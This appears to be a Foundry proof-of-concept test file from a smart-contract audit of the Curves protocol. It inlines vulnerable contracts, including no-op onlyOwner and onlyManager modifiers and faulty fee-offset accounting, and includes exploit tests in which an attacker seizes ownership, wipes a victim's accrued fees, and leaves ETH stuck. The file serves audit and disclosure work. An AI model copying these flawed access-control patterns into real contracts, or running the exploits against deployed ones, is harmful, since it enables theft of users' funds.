// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

// forge test --match-contract Curves_PoC -vv

import "forge-std/Test.sol";
import "forge-std/console.sol";

// ========== Minimal inline copies of in-scope contracts ==========

contract Security {
    address public owner;
    mapping(address => bool) public managers;

    // BUG: Modifiers use bare boolean expressions — NOT require/revert.
    // The comparison result is DISCARDED. Access control is completely bypassed.
    modifier onlyOwner() {
        msg.sender == owner; // <-- no-op!
        _;
    }

    modifier onlyManager() {
        managers[msg.sender] == true; // <-- no-op!
        _;
    }

    constructor() {
        owner = msg.sender;
        managers[msg.sender] = true;
    }

    function setManager(address manager_, bool value) public onlyOwner {
        managers[manager_] = value;
    }

    function transferOwnership(address owner_) public onlyOwner {
        owner = owner_;
    }
}

// Minimal FeeSplitter reproducing the fee-accounting bug
// (stripped of Curves dependency for isolation)
contract FeeSplitterMini is Security {
    uint256 constant PRECISION = 1e18;

    error NoFeesToClaim();
    error NoTokenHolders();

    struct TokenData {
        uint256 cumulativeFeePerToken;
        mapping(address => uint256) userFeeOffset;
        mapping(address => uint256) unclaimedFees;
    }

    mapping(address => TokenData) internal tokensData;
    // Simplified: balanceOf and totalSupply injected externally for test clarity
    mapping(address => mapping(address => uint256)) public balances; // token => user => amount
    mapping(address => uint256) public supplies;

    function setBalance(address token, address user, uint256 bal) external {
        balances[token][user] = bal;
    }

    function setSupply(address token, uint256 s) external {
        supplies[token] = s;
    }

    function balanceOf(address token, address account) public view returns (uint256) {
        return balances[token][account] * PRECISION;
    }

    function totalSupply(address token) public view returns (uint256) {
        return supplies[token] * PRECISION;
    }

    function updateFeeCredit(address token, address account) internal {
        TokenData storage data = tokensData[token];
        uint256 balance = balanceOf(token, account);
        if (balance > 0) {
            uint256 owed = (data.cumulativeFeePerToken - data.userFeeOffset[account]) * balance;
            data.unclaimedFees[account] += owed / PRECISION;
            data.userFeeOffset[account] = data.cumulativeFeePerToken;
        }
    }

    function getClaimableFees(address token, address account) public view returns (uint256) {
        TokenData storage data = tokensData[token];
        uint256 balance = balanceOf(token, account);
        uint256 owed = (data.cumulativeFeePerToken - data.userFeeOffset[account]) * balance;
        return (owed / PRECISION) + data.unclaimedFees[account];
    }

    function claimFees(address token) external {
        updateFeeCredit(token, msg.sender);
        uint256 claimable = getClaimableFees(token, msg.sender);
        if (claimable == 0) revert NoFeesToClaim();
        tokensData[token].unclaimedFees[msg.sender] = 0;
        payable(msg.sender).transfer(claimable);
    }

    function addFees(address token) public payable onlyManager {
        uint256 totalSupply_ = totalSupply(token);
        if (totalSupply_ == 0) revert NoTokenHolders();
        TokenData storage data = tokensData[token];
        data.cumulativeFeePerToken += (msg.value * PRECISION) / totalSupply_;
    }

    // BUG: Resets offset WITHOUT calling updateFeeCredit first.
    // Any fees accumulated since last onBalanceChange are permanently lost.
    function onBalanceChange(address token, address account) public onlyManager {
        TokenData storage data = tokensData[token];
        data.userFeeOffset[account] = data.cumulativeFeePerToken;
    }

    receive() external payable {}
}

// ========== PoC Tests ==========

contract Curves_PoC is Test {

    Security sec;
    FeeSplitterMini splitter;
    address alice = makeAddr("alice");
    address bob = makeAddr("bob");
    address attacker = makeAddr("attacker");
    address TOKEN = makeAddr("someToken");

    function setUp() public {
        sec = new Security();
        splitter = new FeeSplitterMini();
        vm.deal(address(splitter), 10 ether); // pre-fund splitter to simulate accumulated fees
    }

    // =========================================================
    // H-01: Broken access control — anyone can take ownership
    // =========================================================
    function test_control_ownershipIsProtected() public {
        // Expected: transferOwnership must revert when called by non-owner
        vm.prank(attacker);
        // With correct modifiers this should revert — here it PASSES (demonstrating the bug)
        sec.transferOwnership(attacker);
        // If we reach here, the modifier did NOT revert — access control is broken
        assertEq(sec.owner(), attacker, "FAIL: attacker now owns the contract");
    }

    function test_exploit_anyoneCanTakeOwnership() public {
        address originalOwner = sec.owner();
        assertEq(originalOwner, address(this));

        // Attacker hijacks ownership — no privileged access needed
        vm.prank(attacker);
        sec.transferOwnership(attacker);

        assertEq(sec.owner(), attacker);
        console.log("[H-01] EXPLOITED: attacker is now owner, was:", originalOwner);

        // Attacker can now add themselves as manager
        vm.prank(attacker);
        sec.setManager(attacker, true);
        assertTrue(sec.managers(attacker));
        console.log("[H-01] EXPLOITED: attacker is now manager");
    }

    function test_exploit_anyoneCanBecomeManager() public {
        assertFalse(sec.managers(attacker));

        // Attacker adds themselves as manager directly (onlyOwner modifier is broken)
        vm.prank(attacker);
        sec.setManager(attacker, true);

        assertTrue(sec.managers(attacker));
        console.log("[H-01] EXPLOITED: attacker set themselves as manager with no privileges");
    }

    // =========================================================
    // H-02: onBalanceChange resets offset without crediting fees
    //        → sellers permanently lose accrued fees
    // =========================================================
    function test_control_sellerCanClaimAccruedFees() public {
        // Setup: alice holds 10 tokens
        splitter.setBalance(TOKEN, alice, 10);
        splitter.setSupply(TOKEN, 10);

        // Simulate alice's initial balance tracking
        vm.prank(address(this));
        splitter.onBalanceChange(TOKEN, alice);

        // 1 ETH of holder fees added
        splitter.addFees{value: 1 ether}(TOKEN);

        uint256 claimable = splitter.getClaimableFees(TOKEN, alice);
        assertGt(claimable, 0, "Alice should have claimable fees");
        console.log("Alice claimable before sell:", claimable);
    }

    function test_exploit_sellerLosesFeesOnSell() public {
        // Setup: alice holds 10 tokens; bob holds 0
        splitter.setBalance(TOKEN, alice, 10);
        splitter.setSupply(TOKEN, 10);

        // Initial balance tracking (happens on first buy)
        splitter.onBalanceChange(TOKEN, alice);

        // Fees accumulate: 1 ETH distributed to holders
        splitter.addFees{value: 1 ether}(TOKEN);

        uint256 claimableBefore = splitter.getClaimableFees(TOKEN, alice);
        assertEq(claimableBefore, 1 ether);
        console.log("Alice claimable BEFORE sell:", claimableBefore);

        // === Alice sells her tokens ===
        // In real Curves._transferFees(), onBalanceChange is called BEFORE fees are credited
        // This simulates the sell: balance reduced, then onBalanceChange called
        splitter.setBalance(TOKEN, alice, 0); // balance reduced by sell
        splitter.setSupply(TOKEN, 0);

        // onBalanceChange resets offset WITHOUT calling updateFeeCredit
        splitter.onBalanceChange(TOKEN, alice);

        uint256 claimableAfter = splitter.getClaimableFees(TOKEN, alice);
        console.log("Alice claimable AFTER sell:", claimableAfter);

        // Alice's 1 ETH of fees is permanently gone
        assertEq(claimableAfter, 0, "[H-02] Alice lost ALL accrued fees on sell");
        console.log("[H-02] EXPLOITED: Alice lost", claimableBefore - claimableAfter, "wei in fees");
    }

    // =========================================================
    // H-03: Broken onlyManager allows attacker to zero out
    //        any victim's fee balance (griefing / theft)
    // =========================================================
    function test_exploit_attackerZerosVictimFees() public {
        // Setup: alice has 10 tokens and 1 ETH of accrued fees
        splitter.setBalance(TOKEN, alice, 10);
        splitter.setSupply(TOKEN, 10);
        splitter.onBalanceChange(TOKEN, alice); // initial offset = 0
        splitter.addFees{value: 1 ether}(TOKEN);

        uint256 claimableBefore = splitter.getClaimableFees(TOKEN, alice);
        assertEq(claimableBefore, 1 ether);
        console.log("Alice fees before attack:", claimableBefore);

        // Attacker calls onBalanceChange on alice (onlyManager is a no-op)
        // This resets alice's offset to current cumulative WITHOUT crediting her fees
        vm.prank(attacker);
        splitter.onBalanceChange(TOKEN, alice);

        uint256 claimableAfter = splitter.getClaimableFees(TOKEN, alice);
        assertEq(claimableAfter, 0);
        console.log("[H-03] EXPLOITED: Attacker zeroed alice's fees. Remaining:", claimableAfter);
    }

    // =========================================================
    // M-01: Protocol fee deducted from seller but never forwarded
    // =========================================================
    function test_exploit_protocolFeeStuckOnSell() public {
        // price = 1 ether, fees: protocol=5%, subject=3%, referral=1%, holders=1%
        uint256 price = 1 ether;
        uint256 protocolFee = 0.05 ether;
        uint256 subjectFee  = 0.03 ether;
        uint256 referralFee = 0.01 ether;
        uint256 holderFee   = 0.01 ether;

        // sellValue sent to seller
        uint256 sellValue = price - protocolFee - subjectFee - referralFee - holderFee;

        // On sell (no referral defined): seller + subject + holders receive ETH
        // protocolFee and referralFee are deducted from sellValue but sent NOWHERE
        uint256 totalOut = sellValue + subjectFee + holderFee; // referral skipped
        uint256 stuck = price - totalOut;

        assertEq(stuck, protocolFee + referralFee);
        console.log("[M-01] Per-sell ETH stuck in contract:", stuck);
        assertGt(stuck, 0);
    }
}
